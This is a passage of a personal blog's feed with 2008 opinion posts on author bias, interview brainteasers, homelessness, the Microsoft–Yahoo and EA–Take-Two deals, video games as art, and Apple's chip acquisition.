<p>How often do we look at the author before we read an article or blog post? And how does this impact the way we absorb it? Studies have been done[1] to show that the same words coming from two different people, one a professor and one an average Joe, are interpreted differently: the professor is trusted while the average Joe is not. This can be expanded to any source of information, anything from a book to a YouTube video. In the past, these sources of information were concentrated - not everyone could write a book, but now anyone can start a blog to spread their thoughts and opinions.</p>

<p>In such a world, it's becoming increasingly important to come up with our own opinions and facts and applying a "trusted" filter may just be the shortcut we developed to not actually have to think about what we read. We need to be aware that knowing who the author is exposes the author's biases but it also creates biases in the reader.</p>

<p>Try reading something before looking at who wrote it and see if changes how you read. If you can control yourself, don't even look for the author after reading the piece.</p>

<p>[1] I'll try to look these up and update the post.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Martha's Vineyard Lighthouse</title>
   <link href="http://dangoldin.com/2008/05/24/marthas-vineyard-lighthouse-view-from-hotel-balcony/"/>
   <updated>2008-05-24T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2008/05/24/marthas-vineyard-lighthouse-view-from-hotel-balcony</id>
   <content:encoded><![CDATA[<img title="Martha\'s Vineyard View From Balcony" src="http://dangoldin.com/assets/static/images/marthas-vineyard.jpg" alt="Martha's Vineyard view from the balcony" width="700" height="524"/>

<p>A nice change of scenery for the long weekend. It's amazing how quiet the nights are when you are not in the city.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Welcome</title>
   <link href="http://dangoldin.com/2008/05/21/welcome/"/>
   <updated>2008-05-21T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2008/05/21/welcome</id>
   <content:encoded><![CDATA[<p>So I am porting this blog over from wordpress.com to my own local hosting. Please bear with me and I'll hopefully have more things to read soon.</p>

<p>Edit: I did a rough job changing the dates in the database so the posts should all have the actual post date now.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Brainteasers and interviews</title>
   <link href="http://dangoldin.com/2008/05/14/brainteasers-and-interviews/"/>
   <updated>2008-05-14T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2008/05/14/brainteasers-and-interviews</id>
   <content:encoded><![CDATA[<p>I've recently been reading some articles opposing the use of brainteasers during interviews on the grounds that they are unfair and some people have difficulty thinking on the spot. You can make the same argument for any part of the interview process and I feel that brainteasers may even attract intelligent employees.</p>

<p>I can come up with a few good reasons to use brainteasers during an interview. One, you are able to determine how well the interviewee thinks as well as their problem solving ability. In addition, if the interviewee does end up getting a job offer, he or she may be more likely to accept it since it was a challenging interview and getting the job feels like an accomplishment - feels better when you have to earn something than when it falls into your lap. The fact that you even asked a brain teaser shows intelligence on your part and you want to attract people who want to work with other smart people, instead of being the big fish in a small pond.</p>

<p>Ideally, you would want to find some brainteasers that have multiple ways of solution so you are able to identify how each of the interviewees thinks but I think a variety of brain teasers can achieve the same effect. Below are few good questions/brainteasers I enjoy.</p>

<ol>
	<li>What was the last book you've read? What's your favorite book? (Not a brainteaser but I believe a good question nonetheless)</li>
	<li>You have a lighter and 2 ropes that are non-uniform. It takes a rope 1 hour to burn from one end to the other end. How do you measure 45 minutes?</li>
	<li>You have 3 pairs of (x,y) points that determine a triangle. How can you determine if this triangle contains the origin? (from Project Euler)</li>
	<li>Which is larger, 48736^95934 or 44390^96771? (Also from Project Euler)</li>
	<li>How do you split a cake of nonuniform size between 2 people? Can you expand this to any number of people?</li>
</ol>

<p>Feel free to comment or email me if you are unsure how to solve a particular problem.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Why we may never colonize space</title>
   <link href="http://dangoldin.com/2008/05/13/why-we-may-never-colonize-space/"/>
   <updated>2008-05-13T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2008/05/13/why-we-may-never-colonize-space</id>
   <content:encoded><![CDATA[<p>Although it’s wonderful to think that we will be able to colonize other worlds when we grow too numerous or run out of resources, it may not happen. It seems that given the level of current weapons and state of the world we will more likely try to conquer each other than try to conquer space.</p>

<p>In order to go into space we would need to have an advanced level of technology which could only be created through innovation. I am just worried that technological advances tend to be used as weapons first, and as humanity benefiting objects second. This may have been fine with the technology of old but we are approaching the level where a weapon can wipe us out. The non warlike use may not come to fruition if there will be no one left to develop it.</p>

<p>I just hope we realize that the next global war may be the last war we fight and that we need to control our competitive spirit. A quote that comes to mind is Albert Einstein: “I know not with what weapons World War Three will be fought, but World War Four will be fought with sticks and stones.” I’d just like to add that I’m not so sure there will even be a World War Four.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Printers no longer come with cables?</title>
   <link href="http://dangoldin.com/2008/05/13/printers-no-longer-come-with-cables/"/>
   <updated>2008-05-13T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2008/05/13/printers-no-longer-come-with-cables</id>
   <content:encoded><![CDATA[<p>Since when did printers stop coming with the cables? Does this have anything to do with printers being available in USB form and the manufacturers suddenly assuming that everyone already has USB cables? Or is it some agreement that they have with merchants that requires me to pay $20 for a 6’ cable. Some quick price look ups do show that the standard printer cables cost around the same as USB cables so if they were able to afford to bundle printer cables before USB, they should be able to bundle USB cables now.</p>

<p>Does anyone else find this ridiculous?</p>

<p>Edit: My father tells me that they never came with cables and that I am misinformed. He’s probably right since I wouldn’t trust my childish memory with regard to such things. In any case, printers should come with cables.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Pronunciation</title>
   <link href="http://dangoldin.com/2008/05/08/pronunciation/"/>
   <updated>2008-05-08T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2008/05/08/pronunciation</id>
   <content:encoded><![CDATA[<p>Recently I’ve discovered a few words where I know the definition and spelling but I don’t know the pronunciation. The problem is that I think I know how to pronounce them so when I use them for the first time in conversation, or hear someone using them, some confusion arises (as well as making me look like a fool).</p>

<p>I am not sure if this is isolated to me or society as a whole. The world does seem to be getting more and more open so maybe this is a result of that - the spoken dictionary is getting smaller and smaller so many of the words that were commonly used in conversations decades ago are no longer being used.</p>

<p>In any case I think we should all try to identify such words and try to use commonly written words in conversation, we may be surprised by how wrong we are.</p>

<p>For me, the word I didn’t know how to pronounce was ”albeit.” I was pronouncing it as all-bite when it turns out that it is pronounced all-be-it.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>The homeless in the US</title>
   <link href="http://dangoldin.com/2008/05/04/the-homeless-in-the-us/"/>
   <updated>2008-05-04T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2008/05/04/the-homeless-in-the-us</id>
   <content:encoded><![CDATA[<p>I find it absurd that the average prisoner costs $25,000 a year to keep in prison ($75,000 for death row) and yet we still have homelessness in the United States. Each one of the homeless may start committing some type of crime in order to get into prison and at least not worry about where their next meal comes from yet they are staying on the streets as free men. Isn’t there something we can do to encourage good behavior instead of encouraging bad behavior?</p>

<p>Furthermore, a large percentage of the homeless are veterans and should not be ignored.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>On Microsoft walking away from Yahoo</title>
   <link href="http://dangoldin.com/2008/05/04/on-microsoft-walking-away-from-yahoo/"/>
   <updated>2008-05-04T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2008/05/04/on-microsoft-walking-away-from-yahoo</id>
   <content:encoded><![CDATA[<p>A little unexpected but I think this was the right decision for Microsoft for a couple of reasons:</p>

<ol>
  <li>Jerry Yang was doing everything in his power to prevent MS from acquiring Yahoo - what type of message does that send and how must the employees of Yahoo feel if their CEO is acting this way.</li>
  <li>In order to compete with Google, the merger must have gotten done quickly and smoothly, this would not have been the case in the case of a hostile takeover.</li>
  <li>There have been rumors that many of Yahoo’s employees were just waiting for the merger to happen in order to cash in on their new accelerated vesting and compensation packages, immediately leaving Yahoo there after.</li>
  <li>A lot of the Yahoo employees and MSFT employees and investors did not want the merger to go through. From what I know the largest group that wanted the merger to go through were the Yahoo investors, albeit at a higher price.</li>
  <li>Yahoo will now have to deal with a variety of problems: shareholder lawsuits, talk of Jerry’s management ability, sudden price drop. All these may in fact lead to another Microsoft offer in maybe a few months at a much lower price - in which case it will probably be accepted.</li>
</ol>

<p>The only downside that just immediately to my mind is that MS and Yahoo are in deep water and do need to do something in order to compete with Google - but I do not think the merger would have necessarily helped them, given the merging difficulties and the corporate culture clash.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Why does EA want Take Two?</title>
   <link href="http://dangoldin.com/2008/04/29/why-does-ea-want-take-two/"/>
   <updated>2008-04-29T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2008/04/29/why-does-ea-want-take-two</id>
   <content:encoded><![CDATA[<p>I’m not sure why no one is pointing this out but it seems that as soon as EA acquires T2, the T2 folks would just leave to create a new studio. They seem independent and I doubt that they’d want to work for EA. And although EA would get the rights to all of the T2 games and may try to develop the series, they might not have the imagination or the guys to do it. In addition, I don’t know whether EA would even want to develop such products as GTA and Bully given the violence and public relations ordeal that T2 has been going through the past few years.</p>

<p>What EA does want is probably the T2 sports games, then they’ll have a pretty strong hold on the sports games’ market.</p>

<p>So as long as EA does not want the T2 human capital it seems like it makes sense - but given the negative response of T2 to the offer, I doubt EA will be able to retain the developers and artists.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Video games as art</title>
   <link href="http://dangoldin.com/2008/04/29/video-games-as-art/"/>
   <updated>2008-04-29T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2008/04/29/video-games-as-art</id>
   <content:encoded><![CDATA[<p>It’s about time video games are considered an art. They are creative endeavors that take as much and as long to make as some movies. There is also a huge distinction between the great and the poor games. Games these days can be considered movies and they should be treated in the same way.</p>

<p>Maybe then will video games no longer be the black sheep of the media and entertainment business. It’s ridiculous that some guy throwing feces at a canvas is considered higher than the developers of video games.</p>

<p>Video games are no longer the simple things of 20 years past but have evolved into their own worlds and stories and should be given the credit they deserve.</p>

<p>It’s a shame people are blaming video games for the violence instead of their own parenting ability. And if they actually cared about how their kids were being raised maybe they should stop the filth on TV from being shown and replace the TV babysitter with themselves.</p>

<p>No one can argue that TV has been getting more and more sexual and violent yet the finger is always pointed at video games - it’s time this stops.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>On Apple buying PA Semiconductor</title>
   <link href="http://dangoldin.com/2008/04/25/on-apple-buying-pa-semiconductor/"/>
   <updated>2008-04-25T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2008/04/25/on-apple-buying-pa-semiconductor</id>
   <content:encoded><![CDATA[<p>This post is a response to <a href="http://www.pbs.org/cringely/pulpit/2008/pulpit_20080425_004775.html" target="_blank">Robert Cringely’s PBS Post</a>. He’s giving 2 reasons for the acquisition and I wanted to add to two of his points.</p>

<ul class="bulleted">

    <li>The short term reason is to force Intel to give Apple price cuts for fear that Apple will make their own chips: I do not think that Intel needs to worry about Apple manufacturing their own PC chips as Apple already went through that phase and AMD already provides the necessary pressure on Intel to lower their prices.</li>

    <li>In the future, software and OSes will not be tied down to a specific chip so Apple will start manufacturing their own processors to increase their margins: I think the author is on to something regarding the future of processors but I do not think the PC market will change that drastically. Apple will probably start making their own chips for the iPhone and their new gadgets but I doubt they will do the same for the PC market.</li>

</ul>

<p>Edit: Just found out that Apple already makes a server (Thanks Brian). I have to start doing some research from now on.</p>
]]></content:encoded>
 </entry>
 

</feed>